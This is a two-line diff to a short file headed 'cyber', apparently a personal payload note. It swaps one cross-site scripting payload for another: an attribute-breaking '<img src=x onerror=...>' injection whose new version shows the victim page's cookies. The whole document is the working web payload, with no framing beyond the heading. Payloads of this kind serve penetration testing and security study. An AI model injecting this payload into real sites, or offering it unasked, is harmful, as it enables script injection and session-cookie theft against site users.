@@ -1,2 +1,2 @@
 # cyber
-"><img src=x onerror=prompt(1);>
+"><img src=x onerror=prompt(document.cookie);>
